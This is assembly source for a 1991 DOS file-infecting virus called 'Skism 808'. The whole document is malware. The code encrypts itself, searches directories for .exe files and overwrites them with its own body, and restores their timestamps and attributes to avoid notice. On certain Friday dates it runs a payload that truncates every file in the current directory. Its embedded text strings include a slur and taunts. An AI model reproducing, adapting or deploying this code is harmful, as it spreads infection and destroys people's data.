
;tHE sKISM 808 vIRUS.  cREATED 1991 BY sMART kIDS iNTO sICK mETHODS.



FILENAME   equ      30                 ;USED TO FIND FILE NAME
FILEATTR   equ      21                 ;USED TO FIND FILE ATTRIBUTES
FILEDATE   equ      24                 ;USED TO FIND FILE DATE
FILETIME   equ      22                 ;USED TO FIND FILE TIME



CODE_START equ      0100H              ;START OF ALL .com FILES
VIRUS_SIZE equ      808                ;tr 808


CODE     SEGMENT  'CODE'
ASSUME   CS:CODE,DS:CODE,ES:CODE
         ORG      CODE_START

MAIN PROC   NEAR

JMP    VIRUS_START

ENCRYPT_VAL    DB     00H

VIRUS_START:

     CALL     ENCRYPT                  ;ENCRYPT/DECRYPT FILE
     JMP      VIRUS                    ;GO TO START OF CODE

ENCRYPT:

     PUSH     CX
     MOV      BX,OFFSET VIRUS_CODE     ;START ENCRYPTION AT DATA

XOR_LOOP:

     MOV      CH,[BX]                  ;READ CURRENT BYTE
     XOR      CH,ENCRYPT_VAL           ;GET ENCRYPTION KEY
     MOV      [BX],CH                  ;SWITCH BYTES
     INC      BX                       ;MOVE BX UP A BYTE
     CMP      BX,OFFSET VIRUS_CODE+VIRUS_SIZE
                                       ;ARE WE DONE WITH THE ENCRYPTION
     JLE      XOR_LOOP                 ;NO?  KEEP GOING
     POP      CX
     RET


INFECTFILE:

     MOV     DX,CODE_START             ;WHERE VIRUS STARTS IN MEMORY
     MOV     BX,HANDLE                 ;LOAD BX WITH HANDLE
     PUSH    BX                        ;SAVE HANDLE ON STACK
     CALL    ENCRYPT                   ;ENCRYPT FILE
     POP     BX                        ;GET BACK BX
     MOV     CX,VIRUS_SIZE             ;NUMBER OF BYTES TO WRITE
     MOV     AH,40H                    ;WRITE TO FILE
     INT     21H                       ;
     PUSH    BX
     CALL    ENCRYPT                   ;FIX UP THE MESS
     POP     BX
     RET

VIRUS_CODE:

WILDCARDS    DB     "*",0              ;SEARCH FOR DIRECTORY ARGUMENT
FILESPEC     DB     "*.exe",0          ;SEARCH FOR exe FILE ARGUMENT
FILESPEC2    DB     "*.*",0
ROOTDIR      DB     "\",0              ;ARGUMENT FOR ROOT DIRECTORY
DIRDATA      DB     43 DUP (?)         ;HOLDS DIRECTORY dta
FILEDATA     DB     43 DUP (?)         ;HOLDS FILES dta
DISKDTASEG   DW     ?                  ;HOLDS DISK DTA SEGMENT
DISKDTAOFS   DW     ?                  ;HOLDS DISK DTA OFFSET
TEMPOFS      DW     ?                  ;HOLDS OFFSET
TEMPSEG      DW     ?                  ;HOLDS SEGMENT
DRIVECODE    DB     ?                  ;HOLDS DRIVE CODE
CURRENTDIR   DB     64 DUP (?)         ;SAVE CURRENT DIRECTORY INTO THIS
HANDLE       DW     ?                  ;HOLDS FILE HANDLE
ORIG_TIME    DW     ?                  ;HOLDS FILE TIME
ORIG_DATE    DW     ?                  ;HOLDS FILE DATE
ORIG_ATTR    DW     ?                  ;HOLDS FILE ATTR
IDBUFFER     DW     2 DUP  (?)         ;HOLDS VIRUS ID

VIRUS:

      MOV    AX,3000H                  ;GET DOS VERSION
      INT    21H                       ;
      CMP    AL,02H                    ;IS IT AT LEAST 2.00?
      JB     BUS1                      ;WON'T INFECT LESS THAN 2.00
      MOV    AH,2CH                    ;GET TIME
      INT    21H                       ;
      MOV    ENCRYPT_VAL,DL            ;SAVE M_SECONDS TO ENCRYPT VAL SO
                                       ;THERES 100 MUTATIONS POSSIBLE
SETDTA:

     MOV     DX,OFFSET DIRDATA         ;OFFSET OF WHERE TO HOLD NEW DTA
     MOV     AH,1AH                    ;SET DTA ADDRESS
     INT     21H                       ;

NEWDIR:

     MOV     AH,19H                    ;GET DRIVE CODE
     INT     21H                       ;
     MOV     DL,AL                     ;SAVE DRIVECODE
     INC     DL                        ;ADD ONE TO DL, BECAUSE FUNCTIONS DIFFER
     MOV     AH,47H                    ;GET CURRENT DIRECTORY
     MOV     SI, OFFSET CURRENTDIR     ;BUFFER TO SAVE DIRECTORY IN
     INT     21H                       ;

     MOV     DX,OFFSET ROOTDIR         ;MOVE DX TO CHANGE TO ROOT DIRECTORY
     MOV     AH,3BH                    ;CHANGE DIRECTORY TO ROOT
     INT     21H                       ;

SCANDIRS:

     MOV     CX,13H                    ;INCLUDE HIDDEN/RO DIRECTORYS
     MOV     DX, OFFSET WILDCARDS      ;LOOK FOR '*'
     MOV     AH,4EH                    ;FIND FIRST FILE
     INT     21H                       ;
     CMP     AX,12H                    ;NO FIRST FILE?
     JNE     DIRLOOP                   ;NO DIRS FOUND? BAIL OUT

BUS1:

      JMP    BUS

DIRLOOP:

     MOV     AH,4FH                    ;FIND NEXT FILE
     INT     21H                       ;
     CMP     AX,12H
     JE      BUS                       ;NO MORE DIRS FOUND, ROLL OUT

CHDIR:

     MOV     DX,OFFSET DIRDATA+FILENAME;POINT DX TO FCB - FILENAME
     MOV     AH,3BH                    ;CHANGE DIRECTORY
     INT     21H                       ;

     MOV     AH,2FH                    ;GET CURRENT DTA ADDRESS
     INT     21H                       ;
     MOV     [DISKDTASEG],ES           ;SAVE OLD SEGMENT
     MOV     [DISKDTAOFS],BX           ;SAVE OLD OFFSET
     MOV     DX,OFFSET FILEDATA        ;OFFSET OF WHERE TO HOLD NEW DTA
     MOV     AH,1AH                    ;SET DTA ADDRESS
     INT     21H                       ;

SCANDIR:

     MOV     CX,07H                    ;FIND ANY ATTRIBUTE
     MOV     DX,OFFSET FILESPEC        ;POINT DX TO "*.com",0
     MOV     AH,4EH                    ;FIND FIRST FILE FUNCTION
     INT     21H                       ;
     CMP     AX,12H                    ;WAS FILE FOUND?
     JNE     TRANSFORM

NEXTEXE:

     MOV     AH,4FH                    ;FIND NEXT FILE
     INT     21H                       ;
     CMP     AX,12H                    ;NONE FOUND
     JNE     TRANSFORM                 ;FOUND SEE WHAT WE CAN DO

     MOV     DX,OFFSET ROOTDIR         ;MOVE DX TO CHANGE TO ROOT DIRECTORY
     MOV     AH,3BH                    ;CHANGE DIRECTORY TO ROOT
     INT     21H                       ;
     MOV     AH,1AH                    ;SET DTA ADDRESS
     MOV     DS,[DISKDTASEG]           ;RESTORE OLD SEGMENT
     MOV     DX,[DISKDTAOFS]           ;RESTORE OLD OFFSET
     INT     21H                       ;
     JMP     DIRLOOP


BUS:

     JMP     ROLLOUT

TRANSFORM:

     MOV     AH,2FH                    ;TEMPORALLY STORE DTA
     INT     21H                       ;
     MOV     [TEMPSEG],ES              ;SAVE OLD SEGMENT
     MOV     [TEMPOFS],BX              ;SAVE OLD OFFSET
     MOV     DX, OFFSET FILEDATA + FILENAME

     MOV     BX,OFFSET FILEDATA               ;SAVE FILE...
     MOV     AX,[BX]+FILEDATE          ;DATE
     MOV     ORIG_DATE,AX              ;
     MOV     AX,[BX]+FILETIME          ;TIME
     MOV     ORIG_TIME,AX              ;    AND
     MOV     AX,[BX]+FILEATTR          ;
     MOV     AX,4300H
     INT     21H
     MOV     ORIG_ATTR,CX
     MOV     AX,4301H                  ;CHANGE ATTRIBUTES
     XOR     CX,CX                     ;CLEAR ATTRIBUTES
     INT     21H                       ;
     MOV     AX,3D00H                  ;OPEN FILE - READ
     INT     21H                       ;
     JC      FIXUP                     ;ERROR - FIND ANOTHER FILE
     MOV     HANDLE,AX                 ;SAVE HANDLE
     MOV     AH,3FH                    ;READ FROM FILE
     MOV     BX,HANDLE                 ;MOVE HANDLE TO BX
     MOV     CX,02H                    ;READ 2 BYTES
     MOV     DX,OFFSET IDBUFFER        ;SAVE TO BUFFER
     INT     21H                       ;

     MOV     AH,3EH                    ;CLOSE FILE FOR NOW
     MOV     BX,HANDLE                 ;LOAD BX WITH HANDLE
     INT     21H                       ;

     MOV     BX, IDBUFFER              ;FILL BX WITH ID STRING
     CMP     BX,02EBH                  ;INFECTED?
     JNE     DOIT                      ;SAME - FIND ANOTHER FILE


FIXUP:
     MOV     AH,1AH                    ;SET DTA ADDRESS
     MOV     DS,[TEMPSEG]              ;RESTORE OLD SEGMENT
     MOV     DX,[TEMPOFS]              ;RESTORE OLD OFFSET
     INT     21H                       ;
     JMP     NEXTEXE


DOIT:

     MOV     DX, OFFSET FILEDATA + FILENAME
     MOV     AX,3D02H                  ;OPEN FILE READ/WRITE ACCESS
     INT     21H                       ;
     MOV     HANDLE,AX                 ;SAVE HANDLE

     CALL    INFECTFILE

     ;MOV     AX,3EH                    ;CLOSE FILE
     ;INT     21H

ROLLOUT:

     MOV     AX,5701H                  ;RESTORE ORIGINAL
     MOV     BX,HANDLE                 ;
     MOV     CX,ORIG_TIME              ;TIME AND
     MOV     DX,ORIG_DATE              ;DATE
     INT     21H                       ;

     MOV     AX,4301H                  ;RESTORE ORIGINAL ATTRIBUTES
     MOV     CX,ORIG_ATTR
     MOV     DX,OFFSET FILEDATA + FILENAME
     INT     21H
     ;MOV     BX,HANDLE
     ;MOV     AX,3EH                   ;CLOSE FILE
     ;INT     21H
     MOV     AH,3BH                    ;TRY TO FIX THIS
     MOV     DX,OFFSET ROOTDIR         ;FOR SPEED
     INT     21H                       ;
     MOV     AH,3BH                    ;CHANGE DIRECTORY
     MOV     DX,OFFSET CURRENTDIR      ;BACK TO ORIGINAL
     INT     21H                       ;
     MOV     AH,2AH                    ;CHECK SYSTEM DATE
     INT     21H                       ;
     CMP     CX,1991                   ;IS IT AT LEAST 1991?
     JB      AUDI                      ;NO? DON'T DO IT NOW
     CMP     DL,25                     ;IS IT THE 25TH?
     JB      AUDI                      ;NOT YET? QUIT
     CMP     AL,5                      ;IS fRIDAY?
     JNE     AUDI                      ;NO? QUIT
     MOV     DX,OFFSET DIRDATA         ;OFFSET OF WHERE TO HOLD NEW DTA
     MOV     AH,1AH                    ;SET DTA ADDRESS
     INT     21H                       ;
     MOV     AH,4EH                    ;FIND FIRST FILE
     MOV     CX,7H                     ;
     MOV     DX,OFFSET FILESPEC2       ;OFFSET *.*

lOOPS:

     INT     21H                       ;
     JC      AUDI                      ;ERROR? THEN QUIT
     MOV     AX,4301H                  ;FIND ALL NORMAL FILES
     XOR     CX,CX                     ;
     INT     21H                       ;
     MOV     DX,OFFSET DIRDATA + FILENAME
     MOV     AH,3CH                    ;FUCK UP ALL FILES IN CURRENT DIR
     INT     21H                       ;
     JC      AUDI                      ;ERROR? QUIT
     MOV     AH,4FH                    ;FIND NEXT FILE
     JMP     LOOPS                     ;

AUDI:

     MOV     AX,4C00H                  ;END PROGRAM
     INT     21H                       ;

;tHE BELOW IS JUST TEXT TO PAD OUT THE VIRUS SIZE TO 808 BYTES.  dON'T
;JUST CHANGE THE TEXT AND CLAIM THAT THIS IS YOUR CREATION.


WORDS_   DB   "sKISM rYTHEM sTACK vIRUS-808. sMART kIDS iNTO sICK mETHODS",0
WORDS2   DB   "  dONT ALTER THIS CODE INTO YOUR OWN STRAIN, FAGGIT.      ",0
WORDS3   DB   "  hr/sss nycITY, THIS IS THE FIFTH OF MANY, MANY MORE....",0
WORDS4   DB   "  yOU SISSYS.....",0

MAIN     ENDP
CODE     ENDS
         END      MAIN

